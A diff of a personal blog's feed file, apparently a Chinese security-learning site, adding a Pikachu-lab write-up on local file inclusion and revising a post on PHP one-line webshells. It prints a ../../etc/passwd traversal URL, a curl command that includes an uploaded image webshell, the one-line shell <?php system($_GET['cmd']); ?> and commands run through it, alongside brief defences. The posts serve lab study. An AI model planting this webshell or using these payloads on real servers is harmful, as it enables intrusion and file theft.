@@ -4,11 +4,42 @@
   
   
   <entry>
+    <title>文件包含local</title>
+    <link href="/Crow.github.io/2026/10/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlocal/"/>
+    <url>/Crow.github.io/2026/10/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlocal/</url>
+    
+    <content type="html"><![CDATA[<p>工具:Curl</p><p>环境:本地 Pikachu 靶场</p><p>内容:挖掘文件包含local的漏洞</p><p>原理:文件包含:php里有一个include(),作用是把这个文件的内容拿到当前的页面来,如果没规定只能拿什么文件,就可以让它去别的目录拿文件,如果遇到普通文本,会把文字显示出来,如果是php代码还会执行</p><h2 id="1-进入本地皮卡丘靶场"><a href="#1-进入本地皮卡丘靶场" class="headerlink" title="1,进入本地皮卡丘靶场"></a>1,进入本地皮卡丘靶场</h2><img width="1558" height="826" alt="Image" src="https://github.com/user-attachments/assets/b14e3a4f-0e54-4b43-afec-9c586bf87f9f" /><h2 id="2-选择人物点击submit"><a href="#2-选择人物点击submit" class="headerlink" title="2,选择人物点击submit"></a>2,选择人物点击submit</h2><img width="1548" height="794" alt="Image" src="https://github.com/user-attachments/assets/b3440be6-f4a6-49e5-be70-b0275034733e" /><p>发现url地址中包含filename&#x3D;file1.php</p><h2 id="3-现在把url换成系统的只读文件"><a href="#3-现在把url换成系统的只读文件" class="headerlink" title="3,现在把url换成系统的只读文件"></a>3,现在把url换成系统的只读文件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=../../../../etc/passwd&amp;submit=Submit<br></code></pre></td></tr></table></figure><img width="1544" height="860" alt="Image" src="https://github.com/user-attachments/assets/805daee9-fc5a-44ab-82ba-a572eea6fe98" /><p>&#x2F;etc&#x2F;passwd 已经被原样读出来了,filename 本来该填 file1.php,却被我们拿去指定系统文件.</p><h2 id="4-更有意思的是，之前那只“图片马”可以派上用场-把它交给-include-时，服务器不会再看-png-后缀，而是直接把文件内容丢给-PHP-解析器"><a href="#4-更有意思的是，之前那只“图片马”可以派上用场-把它交给-include-时，服务器不会再看-png-后缀，而是直接把文件内容丢给-PHP-解析器" class="headerlink" title="4,更有意思的是，之前那只“图片马”可以派上用场.把它交给 include() 时，服务器不会再看 .png 后缀，而是直接把文件内容丢给 PHP 解析器"></a>4,更有意思的是，之前那只“图片马”可以派上用场.把它交给 include() 时，服务器不会再看 .png 后缀，而是直接把文件内容丢给 PHP 解析器</h2><p>我们利用url上传我们的图片马</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=/app/vul/unsafeupload/uploads/2026/10/23/9209656adaf24988ddd610297742.png&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>再用 <code>curl -s &#39;http://127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2026/10/23/9209656adaf24988ddd610297742.png&amp;submit=Submit&#39; | strings | grep -E &#39;GETIMAGESIZE_OK|&lt;\?php&#39;</code> 查看结果</p><img width="2450" height="112" alt="Image" src="https://github.com/user-attachments/assets/91bc1fad-53fd-4733-987a-97c54cc73fbf" /><p>成功地返回了proof.</p><hr><p>***仅个人学习,不针对任何网站和服务器</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>文件包含</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Curl</tag>
+      
+      <tag>Web</tag>
+      
+      <tag>文件包含</tag>
+      
+      <tag>皮卡丘</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>一句话木马小专栏</title>
     <link href="/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
     <url>/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B0%8F%E4%B8%93%E6%A0%8F/</url>
     
-    <content type="html"><![CDATA[<p>今天时间充足,效率也不错,在此梳理整理一下一句话木马的使用方法,以及如何防守</p><h2 id="何为一句话木马"><a href="#何为一句话木马" class="headerlink" title="何为一句话木马:"></a>何为一句话木马:</h2><p>本质是一段极其简单的恶意脚本,以php为例,最经典的一句话木马如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>逐词解析:</p><ul><li><code>&lt;?php ... ?&gt;</code> 标识符,告诉服务器中间的内容请当做php代码来执行.</li><li><code>system(...)</code> php的内置函数,作用是执行系统底层命令</li><li><code>$_GET[&#39;cmd&#39;]</code> 用来接收参数(Hey bro,去浏览器的URL里找一个叫cmd的参数,把它的值拿过来)</li></ul><p>总结:就像遥控器一样,只要你通过URL里传入一个名为cmd的命令,服务器就会执行</p><h2 id="关键1-找到地址"><a href="#关键1-找到地址" class="headerlink" title="关键1:找到地址"></a>关键1:找到地址</h2><p>Why:我们通过文件上传一句话木马后还不够,因为文件上传之后处于”休眠”状态,我们必须通过准确的URL路径访问,才能出发服务器的解析并执行代码.</p><p>How:真实环境中服务器通常会重命名或移动上传文件,可以通过报错回显,目录扫描,或全盘搜索(grep)确认绝对路径,才能成功连接并控制服务器.(By the way,现在这些我都不会,keep going!)错误路径会给404,路径正确会返回200</p><h2 id="关键2-测试权限"><a href="#关键2-测试权限" class="headerlink" title="关键2:测试权限"></a>关键2:测试权限</h2><p>用?cmd&#x3D;whoami测试成功后,会返回用户名</p><p>www-data&#x2F;apache&#x2F;nginx是web的普通员工权限,是绝大多数漏洞拿到的权限</p><p>root是最高统帅,可以让整个系统想干嘛干嘛.</p><h2 id="关健3-调用指令"><a href="#关健3-调用指令" class="headerlink" title="关健3:调用指令"></a>关健3:调用指令</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">1,看根目录: ?cmd=ls /<br>2,看当前目录: ?cmd=ls<br>3,找到可以文件后读取: ?cmd=cat /flag.txt<br></code></pre></td></tr></table></figure><p>*在ctf中如果是空白页,可以尝试用base64强转,再去解码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?cmd=base64 /flag_xxx.php<br></code></pre></td></tr></table></figure><h2 id="4-防守策略"><a href="#4-防守策略" class="headerlink" title="4:防守策略"></a>4:防守策略</h2><p>1,禁用危险函数<br>2,严格校验文件上传:MIME类型,文件后缀,文件头<br>3,重命名文件</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]></content>
+    <content type="html"><![CDATA[<p>今天时间充足,效率也不错,在此梳理整理一下一句话木马的使用方法,以及如何防守</p><h2 id="何为一句话木马"><a href="#何为一句话木马" class="headerlink" title="何为一句话木马:"></a>何为一句话木马:</h2><p>本质是一段极其简单的恶意脚本,以php为例,最经典的一句话木马如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>逐词解析:</p><ul><li><code>&lt;?php ... ?&gt;</code> 标识符,告诉服务器中间的内容请当做php代码来执行.</li><li><code>system(...)</code> php的内置函数,作用是执行系统底层命令</li><li><code>$_GET[&#39;cmd&#39;]</code> 用来接收参数(Hey bro,去浏览器的URL里找一个叫cmd的参数,把它的值拿过来)</li></ul><p>总结:就像遥控器一样,只要你通过URL里传入一个名为cmd的命令,服务器就会执行</p><h2 id="关键1-找到地址"><a href="#关键1-找到地址" class="headerlink" title="关键1:找到地址"></a>关键1:找到地址</h2><p>Why:我们通过文件上传一句话木马后还不够,因为文件上传之后处于”休眠”状态,我们必须通过准确的URL路径访问,才能触发服务器的解析并执行代码.</p><p>How:真实环境中服务器通常会重命名或移动上传文件,可以通过报错回显,目录扫描,或全盘搜索(grep)确认绝对路径,才能成功连接并控制服务器.(By the way,现在这些我都不会,keep going!)错误路径会给404,路径正确会返回200</p><h2 id="关键2-测试权限"><a href="#关键2-测试权限" class="headerlink" title="关键2:测试权限"></a>关键2:测试权限</h2><p>用?cmd&#x3D;whoami测试成功后,会返回用户名</p><p>www-data&#x2F;apache&#x2F;nginx是web的普通员工权限,是绝大多数漏洞拿到的权限</p><p>root是最高统帅,可以让整个系统想干嘛干嘛.</p><h2 id="关健3-调用指令"><a href="#关健3-调用指令" class="headerlink" title="关健3:调用指令"></a>关健3:调用指令</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">1,看根目录: ?cmd=ls /<br>2,看当前目录: ?cmd=ls<br>3,找到可以文件后读取: ?cmd=cat /flag.txt<br></code></pre></td></tr></table></figure><p>*在ctf中如果是空白页,可以尝试用base64强转,再去解码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?cmd=base64 /flag_xxx.php<br></code></pre></td></tr></table></figure><h2 id="4-防守策略"><a href="#4-防守策略" class="headerlink" title="4:防守策略"></a>4:防守策略</h2><p>1,禁用危险函数<br>2,严格校验文件上传:MIME类型,文件后缀,文件头<br>3,重命名文件</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]></content>
     
     
     <categories>
@@ -53,11 +84,11 @@
       
       <tag>文件上传</tag>
       
-      <tag>Pikachu</tag>
-      
       <tag>Curl</tag>
       
       <tag>getimagesize</tag>
+      
+      <tag>Pikachu</tag>
       
     </tags>
     
@@ -115,11 +146,11 @@
       
       <tag>文件上传</tag>
       
+      <tag>Curl</tag>
+      
       <tag>Pikachu</tag>
       
       <tag>Burp Suite</tag>
-      
-      <tag>Curl</tag>
       
     </tags>
     
